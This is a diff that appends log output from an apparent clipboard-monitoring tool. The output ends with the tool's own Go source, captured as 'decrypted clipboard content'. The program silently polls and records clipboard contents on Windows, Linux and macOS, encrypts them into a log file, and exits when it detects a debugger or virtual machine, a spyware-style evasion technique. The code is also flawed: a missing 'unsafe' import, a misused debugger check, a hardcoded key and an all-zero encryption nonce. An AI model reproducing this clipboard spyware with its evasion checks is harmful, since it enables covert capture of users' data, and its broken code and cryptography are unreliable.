@@ -646,3 +646,351 @@ Below is the revised readClipboardWindows function that eliminates the need for 
 [2024-08-15 21:23:51] Decrypted Clipboard content: 
 [2024-08-15 21:23:59] Encrypted Clipboard content: 
 [2024-08-15 21:23:59] Decrypted Clipboard content: 
+[2024-08-15 21:24:21] Encrypted Clipboard content: 
+[2024-08-15 21:24:21] Decrypted Clipboard content: 
+[2024-08-15 21:24:31] Encrypted Clipboard content: 
+[2024-08-15 21:24:31] Decrypted Clipboard content: 
+[2024-08-15 21:24:36] Encrypted Clipboard content: 
+[2024-08-15 21:24:36] Decrypted Clipboard content: 
+[2024-08-15 21:24:41] Encrypted Clipboard content: 
+[2024-08-15 21:24:41] Decrypted Clipboard content: 
+[2024-08-15 21:24:46] Encrypted Clipboard content: 
+[2024-08-15 21:24:46] Decrypted Clipboard content: 
+[2024-08-15 21:24:50] Encrypted Clipboard content: 
+[2024-08-15 21:24:50] Decrypted Clipboard content: 
+[2024-08-15 21:24:56] Encrypted Clipboard content: 
+[2024-08-15 21:24:56] Decrypted Clipboard content: 
+[2024-08-15 21:25:01] Encrypted Clipboard content: 
+[2024-08-15 21:25:01] Decrypted Clipboard content: 
+[2024-08-15 21:25:05] Encrypted Clipboard content: 
+[2024-08-15 21:25:05] Decrypted Clipboard content: 
+[2024-08-15 21:25:11] Encrypted Clipboard content: 
+[2024-08-15 21:25:11] Decrypted Clipboard content: 
+[2024-08-15 21:25:16] Encrypted Clipboard content: 
+[2024-08-15 21:25:16] Decrypted Clipboard content: 
+[2024-08-15 21:25:22] Encrypted Clipboard content: 
+[2024-08-15 21:25:22] Decrypted Clipboard content: 
+[2024-08-15 21:25:27] Encrypted Clipboard content: 
+[2024-08-15 21:25:27] Decrypted Clipboard content: 
+[2024-08-15 21:25:32] Encrypted Clipboard content: 
+[2024-08-15 21:25:32] Decrypted Clipboard content: 
+[2024-08-15 21:25:37] Encrypted Clipboard content: 
+[2024-08-15 21:25:37] Decrypted Clipboard content: 
+[2024-08-15 21:25:41] Encrypted Clipboard content: 
+[2024-08-15 21:25:41] Decrypted Clipboard content: 
+[2024-08-15 21:25:46] Encrypted Clipboard content: 
+[2024-08-15 21:25:46] Decrypted Clipboard content: 
+[2024-08-15 21:25:57] Encrypted Clipboard content: 
+[2024-08-15 21:25:57] Decrypted Clipboard content: 
+[2024-08-15 21:26:06] Encrypted Clipboard content: 
+[2024-08-15 21:26:06] Decrypted Clipboard content: 
+[2024-08-15 21:26:13] Encrypted Clipboard content: 
+[2024-08-15 21:26:13] Decrypted Clipboard content: 
+[2024-08-15 21:26:18] Encrypted Clipboard content: 
+[2024-08-15 21:26:18] Decrypted Clipboard content: 
+[2024-08-15 21:26:23] Encrypted Clipboard content: 
+[2024-08-15 21:26:23] Decrypted Clipboard content: 
+[2024-08-15 21:26:28] Encrypted Clipboard content: 
+[2024-08-15 21:26:28] Decrypted Clipboard content: 
+[2024-08-15 21:26:34] Encrypted Clipboard content: 
+[2024-08-15 21:26:34] Decrypted Clipboard content: 
+[2024-08-15 21:26:40] Encrypted Clipboard content: 
+[2024-08-15 21:26:40] Decrypted Clipboard content: 
+[2024-08-15 21:26:47] Encrypted Clipboard content: 
+[2024-08-15 21:26:47] Decrypted Clipboard content: 
+[2024-08-15 21:26:53] Encrypted Clipboard content: 
+[2024-08-15 21:26:53] Decrypted Clipboard content: 
+[2024-08-15 21:27:07] Encrypted Clipboard content: 
+[2024-08-15 21:27:07] Decrypted Clipboard content: 
+[2024-08-15 21:27:12] Encrypted Clipboard content: 
+[2024-08-15 21:27:12] Decrypted Clipboard content: 
+[2024-08-15 21:27:18] Encrypted Clipboard content: 
+[2024-08-15 21:27:18] Decrypted Clipboard content: 
+[2024-08-15 21:27:23] Encrypted Clipboard content: 
+[2024-08-15 21:27:23] Decrypted Clipboard content: 
+[2024-08-15 21:27:29] Encrypted Clipboard content: 
+[2024-08-15 21:27:29] Decrypted Clipboard content: 
+[2024-08-15 21:27:33] Encrypted Clipboard content: 
+[2024-08-15 21:27:33] Decrypted Clipboard content: 
+[2024-08-15 21:28:00] Encrypted Clipboard content: 
+[2024-08-15 21:28:00] Decrypted Clipboard content: 
+[2024-08-15 21:28:09] Encrypted Clipboard content: 
+[2024-08-15 21:28:09] Decrypted Clipboard content: 
+[2024-08-15 21:28:17] Encrypted Clipboard content: 
+[2024-08-15 21:28:17] Decrypted Clipboard content: 
+[2024-08-15 21:28:24] Encrypted Clipboard content: 
+[2024-08-15 21:28:24] Decrypted Clipboard content: 
+[2024-08-15 21:28:31] Encrypted Clipboard content: 
+[2024-08-15 21:28:31] Decrypted Clipboard content: 
+[2024-08-15 21:28:38] Encrypted Clipboard content: 
+[2024-08-15 21:28:38] Decrypted Clipboard content: 
+[2024-08-15 21:28:44] Encrypted Clipboard content: 
+[2024-08-15 21:28:44] Decrypted Clipboard content: 
+[2024-08-15 21:28:51] Encrypted Clipboard content: 
+[2024-08-15 21:28:51] Decrypted Clipboard content: 
+[2024-08-15 21:28:57] Encrypted Clipboard content: 
+[2024-08-15 21:28:57] Decrypted Clipboard content: 
+[2024-08-15 21:29:04] Encrypted Clipboard content: 
+[2024-08-15 21:29:04] Decrypted Clipboard content: 
+[2024-08-15 21:29:09] Encrypted Clipboard content: 
+[2024-08-15 21:29:09] Decrypted Clipboard content: 
+[2024-08-15 21:29:15] Encrypted Clipboard content: 
+[2024-08-15 21:29:15] Decrypted Clipboard content: 
+[2024-08-15 21:29:21] Encrypted Clipboard content: 
+[2024-08-15 21:29:21] Decrypted Clipboard content: 
+[2024-08-15 21:29:27] Encrypted Clipboard content: 
+[2024-08-15 21:29:27] Decrypted Clipboard content: 
+[2024-08-15 21:29:33] Encrypted Clipboard content: 
+[2024-08-15 21:29:33] Decrypted Clipboard content: 
+[2024-08-15 21:29:40] Encrypted Clipboard content: 
+[2024-08-15 21:29:40] Decrypted Clipboard content: 
+[2024-08-15 21:29:45] Encrypted Clipboard content: 
+[2024-08-15 21:29:45] Decrypted Clipboard content: 
+[2024-08-15 21:29:51] Encrypted Clipboard content: 
+[2024-08-15 21:29:51] Decrypted Clipboard content: 
+[2024-08-15 21:29:58] Encrypted Clipboard content: 
+[2024-08-15 21:29:58] Decrypted Clipboard content: 
+[2024-08-15 21:30:04] Encrypted Clipboard content: 
+[2024-08-15 21:30:04] Decrypted Clipboard content: 
+[2024-08-15 21:30:09] Encrypted Clipboard content: 
+[2024-08-15 21:30:09] Decrypted Clipboard content: 
+[2024-08-15 21:30:14] Encrypted Clipboard content: 
+[2024-08-15 21:30:14] Decrypted Clipboard content: 
+[2024-08-15 21:30:18] Encrypted Clipboard content: 
+[2024-08-15 21:30:18] Decrypted Clipboard content: 
+[2024-08-15 21:30:24] Encrypted Clipboard content: 
+[2024-08-15 21:30:24] Decrypted Clipboard content: 
+[2024-08-15 21:30:29] Clipboard error: failed to get clipboard data: Thread does not have a clipboard open.
+[2024-08-15 21:53:13] Encrypted Clipboard content: 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
+[2024-08-15 21:53:14] Decrypted Clipboard content: package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/sha256"
+	"encoding/base64"
+	"fmt"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+	"syscall"
+	"time"
+)
+
+const (
+	Logging            = true
+	EncryptionKey      = "your_secret_encryption_key"
+	EnableClipboard    = true
+	CheckInterval      = 2 * time.Second
+)
+
+func main() {
+	if isBeingDebugged() || isRunningInVM() {
+		logMessage("Debugger or VM detected. Exiting.")
+		os.Exit(1)
+	}
+
+	if EnableClipboard {
+		var previousContent string
+		for {
+			content, err := readClipboard()
+			if err != nil {
+				logMessage(fmt.Sprintf("Clipboard error: %v", err))
+				time.Sleep(CheckInterval)
+				continue
+			}
+
+			if content != "" && content != previousContent {
+				encryptedContent := encrypt(content, EncryptionKey)
+				logMessage(fmt.Sprintf("Encrypted Clipboard content: %s", encryptedContent))
+
+				decryptedContent := decrypt(encryptedContent, EncryptionKey)
+				logMessage(fmt.Sprintf("Decrypted Clipboard content: %s", decryptedContent))
+
+				previousContent = content
+			}
+
+			time.Sleep(CheckInterval)
+		}
+	}
+}
+
+func readClipboard() (string, error) {
+	switch runtime.GOOS {
+	case "windows":
+		return readClipboardWindows()
+	case "linux":
+		return readClipboardUnix("xclip", "-selection", "clipboard", "-o")
+	case "darwin":
+		return readClipboardUnix("pbpaste")
+	default:
+		return "", fmt.Errorf("unsupported OS: %s", runtime.GOOS)
+	}
+}
+
+func readClipboardWindows() (string, error) {
+	user32 := syscall.NewLazyDLL("user32.dll")
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+
+	openClipboard := user32.NewProc("OpenClipboard")
+	getClipboardData := user32.NewProc("GetClipboardData")
+	closeClipboard := user32.NewProc("CloseClipboard")
+	globalLock := kernel32.NewProc("GlobalLock")
+	globalUnlock := kernel32.NewProc("GlobalUnlock")
+
+	if _, _, err := openClipboard.Call(0); err != nil && err.Error() != "The operation completed successfully." {
+		return "", fmt.Errorf("failed to open clipboard: %v", err)
+	}
+	defer closeClipboard.Call()
+
+	cfText := uintptr(1)
+	h, _, err := getClipboardData.Call(cfText)
+	if h == 0 {
+		return "", fmt.Errorf("failed to get clipboard data: %v", err)
+	}
+
+	ptr, _, err := globalLock.Call(h)
+	if ptr == 0 {
+		return "", fmt.Errorf("failed to lock global memory: %v", err)
+	}
+	defer globalUnlock.Call(h)
+
+	var text strings.Builder
+	for {
+		c := *(*byte)(unsafe.Pointer(ptr))
+		if c == 0 {
+			break
+		}
+		text.WriteByte(c)
+		ptr++
+	}
+
+	return text.String(), nil
+}
+
+func readClipboardUnix(cmdName string, args ...string) (string, error) {
+	cmd := exec.Command(cmdName, args...)
+	output, err := cmd.Output()
+	if err != nil {
+		return "", fmt.Errorf("failed to read clipboard: %v", err)
+	}
+	return string(output), nil
+}
+
+func encrypt(plainText, key string) string {
+	block, err := aes.NewCipher([]byte(createHash(key)))
+	if err != nil {
+		fmt.Println("Failed to create cipher block:", err)
+		return ""
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		fmt.Println("Failed to create GCM:", err)
+		return ""
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	cipherText := gcm.Seal(nonce, nonce, []byte(plainText), nil)
+	return base64.StdEncoding.EncodeToString(cipherText)
+}
+
+func decrypt(cipherText, key string) string {
+	data, err := base64.StdEncoding.DecodeString(cipherText)
+	if err != nil {
+		fmt.Println("Failed to decode base64 string:", err)
+		return ""
+	}
+
+	block, err := aes.NewCipher([]byte(createHash(key)))
+	if err != nil {
+		fmt.Println("Failed to create cipher block:", err)
+		return ""
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		fmt.Println("Failed to create GCM:", err)
+		return ""
+	}
+
+	nonceSize := gcm.NonceSize()
+	if len(data) < nonceSize {
+		fmt.Println("Ciphertext too short")
+		return ""
+	}
+
+	nonce, cipherTextBytes := data[:nonceSize], data[nonceSize:]
+	plainText, err := gcm.Open(nil, nonce, cipherTextBytes, nil)
+	if err != nil {
+		fmt.Println("Failed to decrypt:", err)
+		return ""
+	}
+	return string(plainText)
+}
+
+func createHash(key string) string {
+	hasher := sha256.New()
+	hasher.Write([]byte(key))
+	return fmt.Sprintf("%x", hasher.Sum(nil))[:32]
+}
+
+func logMessage(message string) {
+	timestamp := time.Now().Format("2006-01-02 15:04:05")
+	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)
+	fmt.Print(logEntry)
+
+	if Logging {
+		logFile := "tool_log.txt"
+		f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			fmt.Printf("Failed to write to log file: %v\n", err)
+			return
+		}
+		defer f.Close()
+
+		if _, err := f.WriteString(logEntry); err != nil {
+			fmt.Printf("Failed to write log entry: %v\n", err)
+		}
+	}
+}
+
+func isBeingDebugged() bool {
+	var isDebuggerPresent bool
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	procIsDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
+	ret, _, _ := procIsDebuggerPresent.Call(uintptr(unsafe.Pointer(&isDebuggerPresent)))
+	return ret != 0
+}
+
+func isRunningInVM() bool {
+	if runtime.GOOS != "windows" {
+		return false
+	}
+
+	vmIndicators := []string{
+		"VMware",
+		"VirtualBox",
+		"QEMU",
+		"Hyper-V",
+		"KVM",
+		"Xen",
+	}
+
+	for _, indicator := range vmIndicators {
+		if isIndicatorPresent(indicator) {
+			return true
+		}
+	}
+	return false
+}
+
+func isIndicatorPresent(indicator string) bool {
+	cmd := exec.Command("powershell", "-Command", "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+	return strings.Contains(string(output), indicator)
+}
+
